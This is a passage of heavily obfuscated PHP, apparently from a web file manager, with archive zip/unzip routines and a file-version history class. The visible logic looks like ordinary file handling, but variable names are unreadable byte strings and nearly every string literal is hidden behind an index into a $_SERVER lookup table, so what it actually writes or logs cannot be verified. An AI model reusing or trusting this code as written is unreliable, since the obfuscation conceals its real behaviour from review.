(!$˜í€¶Ëø) { return !1; } $˜í€¶Ëø = array_merge($˜í€¶Ëø[$„ÌÍ©Ùâ[85]], $˜í€¶Ëø[$„ÌÍ©Ùâ[86]]); return self::zip($˜í€¶Ëø, $âìıÇÕı, $°©®½„¿, $ÁîÌ¹±¾); } public static function zip($¼ô–†Í¤, $­ø¢Ûª¹ = "\172\151\x70", $õ¢Ö¡‰é = '', $¿ó‡öÁì = REPEAT_RENAME) { $‚ì‹»ªÖ =& $_SERVER[ÅÄÇĞô]; if (is_string($¼ô–†Í¤) && $¼ô–†Í¤) { $¼ô–†Í¤ = array(array($‚ì‹»ªÖ[87] => $¼ô–†Í¤)); } $ÏÅÁÄâ = self::init($¼ô–†Í¤[0][$‚ì‹»ªÖ[87]]); $¶‡³­„Ğ = self::info($¼ô–†Í¤[0][$‚ì‹»ªÖ[87]]); $ìÑÎ¿Î£ = $‚ì‹»ªÖ[12]; $„û‘şê = $‚ì‹»ªÖ[12]; $¶®²˜÷‘ = $‚ì‹»ªÖ[12]; if ($õ¢Ö¡‰é && substr($õ¢Ö¡‰é, -1, 1) != $‚ì‹»ªÖ[8]) { $„û‘şê = get_path_father($õ¢Ö¡‰é); $¶®²˜÷‘ = get_path_this($õ¢Ö¡‰é); } else { $„û‘şê = self::pathFather($¶‡³­„Ğ[$‚ì‹»ªÖ[87]]); $¶®²˜÷‘ = $¶‡³­„Ğ[$‚ì‹»ªÖ[32]] . $‚ì‹»ªÖ[10] . $­ø¢Ûª¹; if (count($¼ô–†Í¤) > 1) { $ù·¹å´Ü = IO::info($„û‘şê); $¶®²˜÷‘ = $ù·¹å´Ü[$‚ì‹»ªÖ[32]] . $‚ì‹»ªÖ[10] . $­ø¢Ûª¹; } if ($õ¢Ö¡‰é) { $„û‘şê = $õ¢Ö¡‰é; } } if ($ÏÅÁÄâ->getType() == $‚ì‹»ªÖ[109]) { $Ğ¿Ù¸Ú = self::init($„û‘şê); $¢ÀÌÕÛå = $Ğ¿Ù¸Ú->getType() == $‚ì‹»ªÖ[109] ? $„û‘şê : get_path_father($ÏÅÁÄâ->path); $¢ÀÌÕÛå = IO::getPathInner($¢ÀÌÕÛå); $¢ÀÌÕÛå = rtrim($¢ÀÌÕÛå, $‚ì‹»ªÖ[8]) . $‚ì‹»ªÖ[8]; mk_dir($¢ÀÌÕÛå); } else { $ìÑÎ¿Î£ = TEMP_FILES . $‚ì‹»ªÖ[1288] . time() . rand_string(8) . $‚ì‹»ªÖ[8]; mk_dir($ìÑÎ¿Î£); file_put_contents($ìÑÎ¿Î£ . $‚ì‹»ªÖ[1289], $‚ì‹»ªÖ[12]); $¢ÀÌÕÛå = $ìÑÎ¿Î£; } $£¯™•¾ = IO::info($¢ÀÌÕÛå); if (!$£¯™•¾ || !$£¯™•¾[$‚ì‹»ªÖ[236]]) { show_json(LNG($‚ì‹»ªÖ[1290]), !1); } $¨¸Üœò© = self::zipFileList($¼ô–†Í¤, $ìÑÎ¿Î£); foreach ($¨¸Üœò© as $Ç§Æ­Ç => $î²›Õß) { $¨¸Üœò©[$Ç§Æ­Ç] = self::iconvSystem($î²›Õß); } $Š…æÁ¬ë = get_filename_auto($¢ÀÌÕÛå . $¶®²˜÷‘, $‚ì‹»ªÖ[12], $¿ó‡öÁì); KodArchive::create(self::iconvSystem($Š…æÁ¬ë), $¨¸Üœò©); if (!IO::exist($Š…æÁ¬ë)) { if ($ìÑÎ¿Î£) { del_dir($ìÑÎ¿Î£); } write_log($‚ì‹»ªÖ[1291] . $Š…æÁ¬ë, $‚ì‹»ªÖ[391]); show_json(LNG($‚ì‹»ªÖ[1292]), !1); } if (!$ìÑÎ¿Î£) { return $Š…æÁ¬ë; } $ÊĞÖì× = self::move($Š…æÁ¬ë, $„û‘şê, $¿ó‡öÁì); if ($ìÑÎ¿Î£) { del_dir($ìÑÎ¿Î£); } if (!$Š…æÁ¬ë) { write_log($‚ì‹»ªÖ[1293] . $Š…æÁ¬ë . $‚ì‹»ªÖ[1294] . $„û‘şê, $‚ì‹»ªÖ[391]); show_json(LNG($‚ì‹»ªÖ[1292]), !1); } return $ÊĞÖì×; } public static function unzip($ÉıŠ¿¶¯, $õ©À§±à, $™®¯Î¨ = "\55\x31", $èğ«ÂÕ— = "\162\x65\x70\x6c\x61\x63\145") { $¢¤­ù³ =& $_SERVER[ÅÄÇĞô]; $ËÖ¨é›‚ = parent::info($ÉıŠ¿¶¯); if (!$ËÖ¨é›‚) { show_json(LNG($¢¤­ù³[1295]), !1); } $í¢¯ğ©÷ = IO::infoFullSimple($õ©À§±à); if (!$í¢¯ğ©÷) { $õ©À§±à = IO::mkdir($õ©À§±à); } if (isset($í¢¯ğ©÷[$¢¤­ù³[194]]) && trim($í¢¯ğ©÷[$¢¤­ù³[87]], $¢¤­ù³[8]) != trim($õ©À§±à, $¢¤­ù³[8])) { $¶à‹Öê = KodIO::make($í¢¯ğ©÷[$¢¤­ù³[193]]); $¡Ëëóì = IO::fileNameAuto($¶à‹Öê, $í¢¯ğ©÷[$¢¤­ù³[32]], REPEAT_RENAME_FOLDER, !0); $õ©À§±à = IO::mkdir($¶à‹Öê . $¡Ëëóì); } $™®¯Î¨ = $™®¯Î¨ && $™®¯Î¨ != $¢¤­ù³[1296] ? @json_decode($™®¯Î¨, !0) : -1; $Óá­è¡– = self::unzipPart($ÉıŠ¿¶¯, $™®¯Î¨); if (!$Óá­è¡– || !IO::exist($Óá­è¡–[$¢¤­ù³[233]])) { show_json(LNG($¢¤­ù³[108]), !1); } $Ã·‚ÌÑ¦ = $Óá­è¡–[$¢¤­ù³[1297]][count($Óá­è¡–[$¢¤­ù³[1297]]) - 1]; if ($Ã·‚ÌÑ¦[$¢¤­ù³[1298]] == -1 || substr($Ã·‚ÌÑ¦[$¢¤­ù³[32]], -1, 1) == $¢¤­ù³[8]) { $ã›”ÈÔŞ = $Óá­è¡–[$¢¤­ù³[1299]] . rand_string(10) . $¢¤­ù³[8]; mk_dir($ã›”ÈÔŞ); $ĞôÁ×Ï‡ = count($Óá­è¡–[$¢¤­ù³[1297]]) == 1 ? IO::ext($ÉıŠ¿¶¯) : get_path_ext($Óá­è¡–[$¢¤­ù³[233]]); $ûòğ ø’ = KodArchive::extract(self::iconvSystem($Óá­è¡–[$¢¤­ù³[233]]), $ã›”ÈÔŞ, $Ã·‚ÌÑ¦[$¢¤­ù³[1298]], $¡Ëëóì, $ĞôÁ×Ï‡); self::unzipErrorCheck($ûòğ ø’, array($¢¤­ù³[1300], $ÉıŠ¿¶¯, $ĞôÁ×Ï‡, $õ©À§±à, $Óá­è¡–)); Hook::trigger($¢¤­ù³[1301], $ã›”ÈÔŞ); recursion_dir($ã›”ÈÔŞ, $¶òÃÎ³Æ, $¸àü“Ñâ, 0); $àå = array_merge($¶òÃÎ³Æ, $¸àü“Ñâ); $Ü ‡ÔÃı = array(); foreach ($àå as $¾—Ô¾Õ) { $Êü›Üã  = IO::move(self::iconvApp($¾—Ô¾Õ), $õ©À§±à, $èğ«ÂÕ—); if ($Êü›Üã ) { $Ü ‡ÔÃı[] = $Êü›Üã ; } } del_dir($ã›”ÈÔŞ); } else { $Êü›Üã  = IO::move($Óá­è¡–[$¢¤­ù³[233]], $õ©À§±à, $èğ«ÂÕ—, get_path_this($Ã·‚ÌÑ¦[$¢¤­ù³[32]])); if ($Êü›Üã ) { $Ü ‡ÔÃı[] = $Êü›Üã ; } } return $Ü ‡ÔÃı ? $Ü ‡ÔÃı : !1; } public static function unzipList($‘‡Ò’ç²) { $Ü‹äË =& $_SERVER[ÅÄÇĞô]; $…ˆªşø = isset($‘‡Ò’ç²[$Ü‹äË[1302]]) ? $‘‡Ò’ç²[$Ü‹äË[1302]] : !1; $´ìšÜÚ¤ = isset($‘‡Ò’ç²[$Ü‹äË[1298]]) ? @json_decode($‘‡Ò’ç²[$Ü‹äË[1298]], !0) : -1; $Ñö®„Ú¾ = self::unzipPart($‘‡Ò’ç²[$Ü‹äË[87]], $´ìšÜÚ¤); if (!$Ñö®„Ú¾ || !IO::exist($Ñö®„Ú¾[$Ü‹äË[233]])) { show_json(LNG($Ü‹äË[108]), !1); } $·¼–½Õì = $Ñö®„Ú¾[$Ü‹äË[1297]][count($Ñö®„Ú¾[$Ü‹äË[1297]]) - 1]; $™äç£òû = in_array(IO::ext($Ñö®„Ú¾[$Ü‹äË[233]]), array($Ü‹äË[391], $Ü‹äË[1303], $Ü‹äË[1304], $Ü‹äË[1305], $Ü‹äË[1306], $Ü‹äË[1307])); if (!$…ˆªşø && ($·¼–½Õì[$Ü‹äË[1298]] == -1 || $™äç£òû)) { $÷ç¿İ¼ò = $Ñö®„Ú¾[$Ü‹äË[1299]] . get_path_this($Ñö®„Ú¾[$Ü‹äË[233]]) . $Ü‹äË[1308]; if (!IO::exist($÷ç¿İ¼ò)) { $®ãûŠÂ = $·¼–½Õì[$Ü‹äË[1298]] == -1 ? get_path_ext(IO::pathThis($‘‡Ò’ç²[$Ü‹äË[87]])) : get_path_ext($Ñö®„Ú¾[$Ü‹äË[233]]); $¨Éòãñ§ = KodArchive::listContent(self::iconvSystem($Ñö®„Ú¾[$Ü‹äË[233]]), !0, $®ãûŠÂ); self::unzipErrorCheck($¨Éòãñ§, array($Ü‹äË[1309], $‘‡Ò’ç², $Ñö®„Ú¾)); @file_put_contents($÷ç¿İ¼ò, json_encode($¨Éòãñ§[$Ü‹äË[1310]])); } return @json_decode(IO::getContent($÷ç¿İ¼ò), !0); } IO::fileOut($Ñö®„Ú¾[$Ü‹äË[233]], $…ˆªşø, get_path_this($·¼–½Õì[$Ü‹äË[32]])); die; } private static function zipFileList($ï‘æ¬³õ, $ªó¿€ô = false) { $¶ÙŠÇÈ´ =& $_SERVER[ÅÄÇĞô]; $Š­ß™¬ = array(); foreach ($ï‘æ¬³õ as $ıÕš±–ü) { $ôÎ»ºòß = $ıÕš±–ü[$¶ÙŠÇÈ´[87]]; if ($ªó¿€ô) { $ôÎ»ºòß = self::copy($ıÕš±–ü[$¶ÙŠÇÈ´[87]], $ªó¿€ô, $¶ÙŠÇÈ´[919]); } else { $ĞÓõú‡Â = self::init($ıÕš±–ü[$¶ÙŠÇÈ´[87]]); if ($ĞÓõú‡Â->getType() == $¶ÙŠÇÈ´[109]) { $ôÎ»ºòß = $ĞÓõú‡Â->path; } } if ($ôÎ»ºòß && self::local()->exist($ôÎ»ºòß)) { $Š­ß™¬[$ıÕš±–ü[$¶ÙŠÇÈ´[87]]] = $ôÎ»ºòß; } } if (!empty($Š­ß™¬)) { return array_values($Š­ß™¬); } show_json(LNG($¶ÙŠÇÈ´[1269]), !1); } private static function localFilePath($ãÅ¦Ú”›) { $ë‘©ë• =& $_SERVER[ÅÄÇĞô]; $ÜÓ¾¬’Ï = KodIO::parse($ãÅ¦Ú”›); if ($ÜÓ¾¬’Ï[$ë‘©ë•[33]] == KodIO::KOD_SOURCE) { $ıÍŸêĞà = Model($ë‘©ë•[925])->fileInfoGet(KodIO::sourceID($ãÅ¦Ú”›)); if (!$ıÍŸêĞà[$ë‘©ë•[87]]) { show_json($ë‘©ë•[1311], !1); } $ãÅ¦Ú”› = $ıÍŸêĞà[$ë‘©ë•[87]]; } $Èæè±‹¬ = self::init($ãÅ¦Ú”›); if ($Èæè±‹¬->pathParse[$ë‘©ë•[1255]]) { $ãÅ¦Ú”› = $Èæè±‹¬->pathParse[$ë‘©ë•[1255]]; $Èæè±‹¬ = self::init($ãÅ¦Ú”›); } $¬à„£şÁ = $Èæè±‹¬->getType(); if ($¬à„£şÁ == $ë‘©ë•[109] || $¬à„£şÁ == $ë‘©ë•[1312]) { if (!$Èæè±‹¬->exist($Èæè±‹¬->path)) { show_json(LNG($ë‘©ë•[108]), !1); } return $Èæè±‹¬->path; } return !1; } public static function unzipPart($Ö–£È³ç, $º¨µïëÔ = -1) { $òİÉ˜ÄÜ =& $_SERVER[ÅÄÇĞô]; $»­–ò¦ = IO::pathThis($Ö–£È³ç); if (!$º¨µïëÔ || $º¨µïëÔ == -1) { $Âø¨¯‘¾ = array(array($òİÉ˜ÄÜ[32] => $»­–ò¦, $òİÉ˜ÄÜ[1298] => -1)); $Âø¨¯‘¾[0][$òİÉ˜ÄÜ[1313]] = $Âø¨¯‘¾[0][$òİÉ˜ÄÜ[32]]; } else { if (is_array($º¨µïëÔ)) { $Âø¨¯‘¾ = $º¨µïëÔ; $å´¹ª = count($Âø¨¯‘¾) - 1; for ($¤‘­»‚ = 0; $¤‘­»‚ <= $å´¹ª; $¤‘­»‚++) { $üî•‡Ãâ = $Âø¨¯‘¾[$¤‘­»‚]; $Ä²ğ¬ê– = get_path_this($üî•‡Ãâ[$òİÉ˜ÄÜ[32]]) . (checkExtSafe($üî•‡Ãâ[$òİÉ˜ÄÜ[32]]) ? $òİÉ˜ÄÜ[12] : $òİÉ˜ÄÜ[1314]); $Âø¨¯‘¾[$¤‘­»‚][$òİÉ˜ÄÜ[1313]] = $òİÉ˜ÄÜ[1315] . intval($üî•‡Ãâ[$òİÉ˜ÄÜ[1298]]) . $òİÉ˜ÄÜ[465] . $Ä²ğ¬ê–; if ($¤‘­»‚ == 0) { continue; } $Âø¨¯‘¾[$¤‘­»‚][$òİÉ˜ÄÜ[1313]] = $Âø¨¯‘¾[$¤‘­»‚ - 1][$òİÉ˜ÄÜ[1313]] . $òİÉ˜ÄÜ[1316] . $Âø¨¯‘¾[$¤‘­»‚][$òİÉ˜ÄÜ[1313]]; } } } if (!is_array($Âø¨¯‘¾) || count($Âø¨¯‘¾) == 0) { return !1; } $ÇËå›©º = $Âø¨¯‘¾[count($Âø¨¯‘¾) - 1]; if (!IO::exist($Ö–£È³ç)) { return !1; } $“ñ‡´´ê = TEMP_FILES . $òİÉ˜ÄÜ[1317] . kodIO::hashPathSafe($Ö–£È³ç) . $òİÉ˜ÄÜ[8]; $ÚòÍñ×¤ = $“ñ‡´´ê . $ÇËå›©º[$òİÉ˜ÄÜ[1313]]; mk_dir($“ñ‡´´ê); file_put_contents(TEMP_FILES . $òİÉ˜ÄÜ[1289], $òİÉ˜ÄÜ[12]); if (IO::exist($ÚòÍñ×¤)) { return array($òİÉ˜ÄÜ[233] => $ÚòÍñ×¤, $òİÉ˜ÄÜ[1297] => $Âø¨¯‘¾, $òİÉ˜ÄÜ[1299] => $“ñ‡´´ê); } $°Ø›˜²ö = self::localFilePath($Ö–£È³ç); if (!$°Ø›˜²ö) { $°Ø›˜²ö = $“ñ‡´´ê . $òİÉ˜ÄÜ[1318]; if (!IO::exist($°Ø›˜²ö)) { self::copy($Ö–£È³ç, $“ñ‡´´ê, !1, get_path_this($°Ø›˜²ö)); } } if (!$°Ø›˜²ö || !IO::exist($°Ø›˜²ö)) { return !1; } if ($ÇËå›©º[$òİÉ˜ÄÜ[1298]] == -1) { return array($òİÉ˜ÄÜ[233] => $°Ø›˜²ö, $òİÉ˜ÄÜ[1297] => $Âø¨¯‘¾, $òİÉ˜ÄÜ[1299] => $“ñ‡´´ê); } $š¬ä®à· = $°Ø›˜²ö; foreach ($Âø¨¯‘¾ as $¤‘­»‚ => $üî•‡Ãâ) { if (!$üî•‡Ãâ || $üî•‡Ãâ[$òİÉ˜ÄÜ[1298]] == $òİÉ˜ÄÜ[1296]) { break; } if (substr($üî•‡Ãâ[$òİÉ˜ÄÜ[32]], -1, 1) == $òİÉ˜ÄÜ[8]) { break; } $º”¶Õ¿ = in_array(get_path_ext($üî•‡Ãâ[$òİÉ˜ÄÜ[1313]]), array($òİÉ˜ÄÜ[391], $òİÉ˜ÄÜ[1303], $òİÉ˜ÄÜ[1304], $òİÉ˜ÄÜ[1305], $òİÉ˜ÄÜ[1306], $òİÉ˜ÄÜ[1307])); $Ì®ÊöÅş = $¤‘­»‚ == count($Âø¨¯‘¾) - 1 && $º”¶Õ¿; $û½é–’° = $“ñ‡´´ê . $üî•‡Ãâ[$òİÉ˜ÄÜ[1313]]; $À£Æ¸òÂ = $“ñ‡´´ê . get_path_this($üî•‡Ãâ[$òİÉ˜ÄÜ[32]]); if (IO::exist($û½é–’°)) { $š¬ä®à· = $û½é–’°; continue; } $£ÉÔ½íŸ = $¤‘­»‚ == 0 ? get_path_ext($»­–ò¦) : get_path_ext($š¬ä®à·); $´û•›†à = KodArchive::extract(self::iconvSystem($š¬ä®à·), $“ñ‡´´ê, $üî•‡Ãâ[$òİÉ˜ÄÜ[1298]], $÷€•ÈÊ¸, $£ÉÔ½íŸ); self::unzipErrorCheck($´û•›†à, array($òİÉ˜ÄÜ[1319], $Ö–£È³ç, $Âø¨¯‘¾, $üî•‡Ãâ, $û½é–’°)); if (IO::exist($À£Æ¸òÂ)) { IO::rename($À£Æ¸òÂ, get_path_this($û½é–’°)); } $š¬ä®à· = $û½é–’°; } $ÚòÍñ×¤ = $š¬ä®à·; return array($òİÉ˜ÄÜ[233] => $š¬ä®à·, $òİÉ˜ÄÜ[1297] => $Âø¨¯‘¾, $òİÉ˜ÄÜ[1299] => $“ñ‡´´ê); } private static function unzipErrorCheck($—òğìÃ, $Úí¹Œ½ = false) { $Ï¤‰¬Æ¹ =& $_SERVER[ÅÄÇĞô]; if ($—òğìÃ[$Ï¤‰¬Æ¹[1320]]) { return !0; } write_log(array($Ï¤‰¬Æ¹[1321], $—òğìÃ, $Úí¹Œ½), $Ï¤‰¬Æ¹[1322]); $üì»Í€Ñ = is_array($—òğìÃ[$Ï¤‰¬Æ¹[1310]]) ? json_encode($—òğìÃ[$Ï¤‰¬Æ¹[1310]]) : $—òğìÃ[$Ï¤‰¬Æ¹[1310]]; show_json($Ï¤‰¬Æ¹[1323] . $üì»Í€Ñ, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ö¼È‡… =& $_SERVER[ÅÄÇĞô]; $Ï€£ÅÕ  = $GLOBALS[$ö¼È‡…[6]][$ö¼È‡…[92]]; if ($Ï€£ÅÕ [$ö¼È‡…[1324]] != 1) { return; } if ($Ï€£ÅÕ [$ö¼È‡…[1325]] <= 0) { return; } if (isset($_REQUEST[$ö¼È‡…[1326]]) && $_REQUEST[$ö¼È‡…[1326]] == $ö¼È‡…[91]) { return; } Hook::bind($ö¼È‡…[1327], $ö¼È‡…[1328]); Hook::bind($ö¼È‡…[1329], $ö¼È‡…[1330]); Hook::bind($ö¼È‡…[1331], $ö¼È‡…[1332]); Hook::bind($ö¼È‡…[1333], $ö¼È‡…[1334]); Hook::bind($ö¼È‡…[1335], $ö¼È‡…[1336]); Hook::bind($ö¼È‡…[1337], $ö¼È‡…[1338]); } public static function eventBeforeUpload($‰ëÔ–›) { if ($‰ëÔ–›[3] && $‰ëÔ–›[3] != REPEAT_REPLACE) { return; } $Ûíşóıå = self::parsePath($‰ëÔ–›[0]); if (!$Ûíşóıå) { return; } self::add($Ûíşóıå); } public static function eventBeforeEdit($âüôÑ¹Í) { $Î®ıôŠŸ = self::parsePath($âüôÑ¹Í[0]); if (!$Î®ıôŠŸ) { return; } self::add($Î®ıôŠŸ); } public static function eventBeforeCopyFile($Ü¢ÖÇëä, $î«¹‡ı©, $„£ª…ù¡, $÷¼®Èšç, $›é­³å÷, $Õ„ÉÉ¤) { $ï³˜±›Ö =& $_SERVER[ÅÄÇĞô]; if (isset($„£ª…ù¡->_data[$ï³˜±›Ö[1259]]) && $„£ª…ù¡->_data[$ï³˜±›Ö[1259]]) { return; } $¡˜Õà»ş = $„£ª…ù¡->getPathOuter($÷¼®Èšç); $…‘óñÛ» = self::parsePath($¡˜Õà»ş); if (!$…‘óñÛ») { return; } self::add($…‘óñÛ»); } public static function eventBeforeRename($Í®Ï››Í) { $‰æ¡˜¶Î =& $_SERVER[ÅÄÇĞô]; $À÷’á‡á = self::parsePath($Í®Ï››Í[0]); if (!$À÷’á‡á) { return; } $°¨ğ€²ç = self::checkInHistory($À÷’á‡á); if (!$°¨ğ€²ç) { return; } if ($°¨ğ€²ç[$‰æ¡˜¶Î[33]] == $‰æ¡˜¶Î[233]) { $Ñ”öõ¤Ş = self::listData($À÷’á‡á); if ($Ñ”öõ¤Ş && $Ñ”öõ¤Ş[$‰æ¡˜¶Î[448]]) { self::moveHistory($À÷’á‡á, $Í®Ï››Í[1]); } } else { IO::rename($°¨ğ€²ç[$‰æ¡˜¶Î[87]], $Í®Ï››Í[1]); } } public static function eventBeforeMove($—ÎÍ¼¥) { $—¹¤£úÊ =& $_SERVER[ÅÄÇĞô]; $Íƒåğ³î = self::parsePath($—ÎÍ¼¥[0]); if (!$Íƒåğ³î) { return; } $‘åÔ÷Ä = self::parsePath($—ÎÍ¼¥[1]); if (!$‘åÔ÷Ä) { return; } $‡¢¾ŠŞí = $—ÎÍ¼¥[3]; $ÂÃóãëÙ = self::checkInHistory($Íƒåğ³î); if (!$ÂÃóãëÙ) { return; } $¥òƒğå… = self::pathHistory($‘åÔ÷Ä); if ($ÂÃóãëÙ[$—¹¤£úÊ[33]] == $—¹¤£úÊ[233]) { $õÊ”µîì = self::listData($Íƒåğ³î); $‹Ú³áñÅ = rtrim($‘åÔ÷Ä, $—¹¤£úÊ[8]) . $—¹¤£úÊ[8] . ($‡¢¾ŠŞí ? $‡¢¾ŠŞí : get_path_this($Íƒåğ³î)); $›û×íò = self::listData($‹Ú³áñÅ); if ($õÊ”µîì && $õÊ”µîì[$—¹¤£úÊ[448]] && $›û×íò && $›û×íò[$—¹¤£úÊ[448]]) { return self::clear($Íƒåğ³î); } if ($õÊ”µîì && $õÊ”µîì[$—¹¤£úÊ[448]]) { self::moveHistory($Íƒåğ³î, $‡¢¾ŠŞí, $¥òƒğå…); } } else { IO::move($ÂÃóãëÙ[$—¹¤£úÊ[87]], $¥òƒğå…, !1, $‡¢¾ŠŞí); self::clearEmptyFolder(IO::pathFather($ÂÃóãëÙ[$—¹¤£úÊ[87]])); } } public static function eventAfterRemove($ú¼È¥ÏÑ, $¹º·Š´í) { $Üù•  =& $_SERVER[ÅÄÇĞô]; if (!$¹º·Š´í) { return; } $Ô¿±‘« = self::parsePath($ú¼È¥ÏÑ[0]); if (!$Ô¿±‘«) { return; } $ªÙÛ–í = self::checkInHistory($Ô¿±‘«); if (!$ªÙÛ–í) { return; } if ($ªÙÛ–í[$Üù• [33]] == $Üù• [233]) { $ìÄš­ = self::listData($Ô¿±‘«, !1); if ($ìÄš­ && $ìÄš­[$Üù• [448]]) { self::clear($Ô¿±‘«, !1); } } else { IO::remove($ªÙÛ–í[$Üù• [87]]); self::clearEmptyFolder(IO::pathFather($ªÙÛ–í[$Üù• [87]])); } } private static function checkInHistory($ıËÏíêº) { $µØ¨­ÔÓ = self::pathHistory($ıËÏíêº); if (!IO::exist($µØ¨­ÔÓ)) { $µØ¨­ÔÓ .= $_SERVER[ÅÄÇĞô][1339]; } return IO::exist($µØ¨­ÔÓ) ? IO::info($µØ¨­ÔÓ) : !1; } private static function parsePath($ü×·İ³) { $€í·ÏĞ° =& $_SERVER[ÅÄÇĞô]; if (!$ü×·İ³) { return !1; } if (isset($GLOBALS[$€í·ÏĞ°[1340]]) && $GLOBALS[$€í·ÏĞ°[1340]]) { return; } $†ö¯ÂÊ‹ = KodIO::parse($ü×·İ³); $­Ã¤º›Ş = $†ö¯ÂÊ‹[$€í·ÏĞ°[33]]; $Èç»À¨ = !$­Ã¤º›Ş || $­Ã¤º›Ş == KodIO::KOD_IO || $­Ã¤º›Ş == KodIO::KOD_SHARE_ITEM; if (!$Èç»À¨ || !$†ö¯ÂÊ‹[$€í·ÏĞ°[1341]]) { return !1; } if (substr($ü×·İ³, 0, strlen(DATA_PATH . $€í·ÏĞ°[1342])) == DATA_PATH . $€í·ÏĞ°[1342]) { return !1; } if ($­Ã¤º›Ş == KodIO::KOD_SHARE_ITEM) { $Ğñˆı”Ï = IO::init($ü×·İ³); if ($Ğñˆı”Ï->pathParse[$€í·ÏĞ°[1255]]) { return self::parsePath($Ğñˆı”Ï->pathParse[$€í·ÏĞ°[1255]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ÕÊÚ“Ä = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $€í·ÏĞ°[1343]); foreach ($ÕÊÚ“Ä as $ÆÇŞòö) { if (!$­Ã¤º›Ş && substr($ü×·İ³, 0, strlen($ÆÇŞòö)) == $ÆÇŞòö) { return !1; } } self::log($GLOBALS[$€í·ÏĞ°[1250]] . $€í·ÏĞ°[1344] . $ü×·İ³); return $ü×·İ³; } private static function pathHistory($¨û¦À) { $Ó¾òö£ =& $_SERVER[ÅÄÇĞô]; $ÔğŠóå¬ = self::$_historyBase . ltrim(KodIO::clear($¨û¦À), $Ó¾òö£[8]); $ÔğŠóå¬ = str_replace(array($Ó¾òö£[1345]), array($Ó¾òö£[1346]), $ÔğŠóå¬); return $ÔğŠóå¬; } public static function log($ÃÓ‡Óªç) { } public static function historyCount($¸çéÀşö) { $ÎÛşß§É =& $_SERVER[ÅÄÇĞô]; $÷ö·ªø¡ = array(); $»»ş”„ø = array(); foreach ($¸çéÀşö as $áÀÍÄ¦¨) { $º¨´×² = get_path_father($áÀÍÄ¦¨); if (!$»»ş”„ø[$º¨´×²]) { $»»ş”„ø[$º¨´×²] = array(); } $»»ş”„ø[$º¨´×²][] = get_path_this($áÀÍÄ¦¨); } foreach ($»»ş”„ø as $º¨´×² => $“¸‡ÀÌ¤) { $óß“ƒÃÑ = self::parsePath($º¨´×²); if (!$óß“ƒÃÑ) { continue; } foreach ($“¸‡ÀÌ¤ as $ÅåØò„Ğ) { $×º¹›ÛĞ = self::listData(rtrim($óß“ƒÃÑ, $ÎÛşß§É[8]) . $ÎÛşß§É[8] . $ÅåØò„Ğ, !1); if ($×º¹›ÛĞ && $×º¹›ÛĞ[$ÎÛşß§É[448]]) { $÷ö·ªø¡[rtrim($º¨´×², $ÎÛşß§É[8]) . $ÎÛşß§É[8] . $ÅåØò„Ğ] = count($×º¹›ÛĞ[$ÎÛşß§É[448]]); } } } return $÷ö·ªø¡; } public static function add($İÖ “‘) { $¡’î°˜î =& $_SERVER[ÅÄÇĞô]; $â²¯ÄĞÙ = self::listData($İÖ “‘); if (!$â²¯ÄĞÙ) { return; } $–™ÍéŠø = Model($¡’î°˜î[865])->get($¡’î°˜î[1347]); $òÙË­¢‡ = intval($GLOBALS[$¡’î°˜î[6]][$¡’î°˜î[92]][$¡’î°˜î[1325]]); $é¤ó¬û = $–™ÍéŠø == $¡’î°˜î[1348] ? min(5, $òÙË­¢‡) : $òÙË­¢‡; if ($òÙË­¢‡ <= 0) { return; } $´èãŸÊ‚ = IO::info($İÖ “‘); $ıÊÔ¼Ï¦ = $â²¯ÄĞÙ[$¡’î°˜î[448]]; if ($´èãŸÊ‚[$¡’î°˜î[79]] == 0) { return; } if ($´èãŸÊ‚[$¡’î°˜î[79]] >= 1024 * 1024 * 500) { return !1; } $ÁµıÍë¥ = IO::hashSimple($İÖ “‘); if ($ıÊÔ¼Ï¦ && $ıÊÔ¼Ï¦[0][$¡’î°˜î[680]] == $ÁµıÍë¥) { return !0; } if (array_key_exists($¡’î°˜î[236], $´èãŸÊ‚) && !$´èãŸÊ‚[$¡’î°˜î[236]]) { return !1; } $ªéÖÊºÈ = short_id(time()); $”ó–¬±³ = array($¡’î°˜î[478] => $ªéÖÊºÈ, $¡’î°˜î[680] => $ÁµıÍë¥, $¡’î°˜î[32] => $´èãŸÊ‚[$¡’î°˜î[32]] . $¡’î°˜î[10] . date($¡’î°˜î[1349]) . rand_string(1), $¡’î°˜î[79] => $´èãŸÊ‚[$¡’î°˜î[79]], $¡’î°˜î[530] => USER_ID, $¡’î°˜î[234] => time(), $¡’î°˜î[1350] => $¡’î°˜î[12]); IO::mkdir($â²¯ÄĞÙ[$¡’î°˜î[1351]]); $œìøêËô = IO::copy($İÖ “‘, $â²¯ÄĞÙ[$¡’î°˜î[1351]], !1, $”ó–¬±³[$¡’î°˜î[32]]); if (!$œìøêËô) { self::clearEmptyFolder($â²¯ÄĞÙ[$¡’î°˜î[1351]]); return !1; } array_unshift($ıÊÔ¼Ï¦, $”ó–¬±³); if (count($ıÊÔ¼Ï¦) > $é¤ó¬û) { $úÇ¡·£ = array_slice($ıÊÔ¼Ï¦, $é¤ó¬û); foreach ($úÇ¡·£ as $šÕƒµ¯ì) { IO::remove($â²¯ÄĞÙ[$¡’î°˜î[1351]] . $šÕƒµ¯ì[$¡’î°˜î[32]]); } $ıÊÔ¼Ï¦ = array_slice($ıÊÔ¼Ï¦, 0, $é¤ó¬û); } return self::saveData($â²¯ÄĞÙ[$¡’î°˜î[1352]], $ıÊÔ¼Ï¦); } public static function remove($İ©‘¤†¤, $¶ÓûÈñš) { $ÌŞ„ß’ =& $_SERVER[ÅÄÇĞô]; $õÏ´ù® = self::listData($İ©‘¤†¤); $²¶­ˆ¾ = array(); if (!$õÏ´ù®) { return !1; } foreach ($õÏ´ù®[$ÌŞ„ß’[448]] as $£“¬Í’”) { if ($£“¬Í’”[$ÌŞ„ß’[478]] == $¶ÓûÈñš) { IO::remove($õÏ´ù®[$ÌŞ„ß’[1351]] . $£“¬Í’”[$ÌŞ„ß’[32]]); continue; } $²¶­ˆ¾[] = $£“¬Í’”; } return self::saveData($õÏ´ù®[$ÌŞ„ß’[1352]], $²¶­ˆ¾); } public static function clear($‰­êø¶û, $ÉÚÕî˜ = true) { $—Ê²«ì’ =& $_SERVER[ÅÄÇĞô]; $«´¡‰é± = self::listData($‰­êø¶û, $ÉÚÕî˜); if (!$«´¡‰é±) { return !1; } foreach ($«´¡‰é±[$—Ê²«ì’[448]] as $¡¡ûğŒÜ) { IO::remove($«´¡‰é±[$—Ê²«ì’[1351]] . $¡¡ûğŒÜ[$—Ê²«ì’[32]]); } return 